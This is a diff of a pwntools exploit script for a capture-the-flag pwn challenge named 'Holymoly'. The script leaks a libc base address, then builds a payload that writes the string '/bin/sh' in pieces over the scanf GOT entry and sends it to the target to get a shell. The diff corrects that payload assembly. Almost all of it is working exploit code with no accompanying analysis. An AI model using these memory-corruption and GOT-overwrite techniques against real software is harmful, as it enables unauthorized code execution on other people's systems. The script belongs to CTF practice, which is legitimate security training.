@@ -40,8 +40,6 @@ elf = ELF("./Pwnable/Holymoly/problem/holymoly")
 # OperateSwitch: 0x40157d
 # phrases: 0x403d00 (mystery.str = 0x40206a)
 
-# holymoly_addr = 0x402085
-
 increase_0x1000 = b"holymoly"
 increase_0x100 = b"rolypoly"
 increase_0x10 = b"monopoly"
@@ -101,22 +99,28 @@ lib_base = u64(rem.recvn(6).ljust(8, b"\x00")) - 0x606f0
 
 success("lib base", lib_base)
 
+ptr = 0
+val = 0
+isPtr = False
 
 bits = u64(b"/b".ljust(8, b"\x00"))
 holymoly_addr = elf.got['__isoc99_scanf']
 payload = make_cmd(holymoly_addr, forPtr=True)
 payload += make_cmd(bits, forPtr=False)
+payload += write_cmd
 bits = u64(b"in".ljust(8, b"\x00"))
-payload = make_cmd(holymoly_addr - 2, forPtr=True)
-payload += make_cmd(bits, forPtr=False)
-bits = u64(b"/s".ljust(8, b"\x00"))
-payload = make_cmd(holymoly_addr - 4, forPtr=True)
-payload += make_cmd(bits, forPtr=False)
-bits = u64(b"h".ljust(8, b"\x00"))
-payload = make_cmd(holymoly_addr - 6, forPtr=True)
+payload += make_cmd(holymoly_addr - 2, forPtr=True)
 payload += make_cmd(bits, forPtr=False)
 payload += write_cmd
-# print(hex(len(payload)))
+bits = u64(b"/s".ljust(8, b"\x00"))
+payload += make_cmd(holymoly_addr - 4, forPtr=True)
+payload += make_cmd(bits, forPtr=False)
+payload += write_cmd
+bits = u64(b"h".ljust(8, b"\x00"))
+payload += make_cmd(holymoly_addr - 6, forPtr=True)
+payload += make_cmd(bits, forPtr=False)
+payload += write_cmd
+print(hex(len(payload)))
 
 gdb.attach(rem)
 rem.sendlineafter(b"? ", payload)
